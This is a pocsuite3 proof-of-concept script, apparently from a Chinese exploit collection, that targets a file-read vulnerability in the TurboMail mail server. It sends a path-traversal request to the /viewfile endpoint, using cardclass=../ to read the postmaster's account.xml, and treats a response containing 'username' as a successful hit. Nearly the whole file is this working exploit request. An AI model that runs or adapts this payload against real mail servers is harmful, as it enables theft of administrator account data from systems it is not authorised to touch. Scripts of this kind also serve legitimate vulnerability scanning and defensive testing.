# _*_ coding:utf-8 _*_
# @Time : 2023/12/19
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class TurboMail_view_fileread(POCBase):
    pocDesc = '''TurboMail viewfile 文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-19'
    name = 'TurboMail viewfile 文件读取漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml'

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
            'Accept-Language': 'en-US;q=0.9,en;q=0.8'
        }

        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'username' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(TurboMail_view_fileread)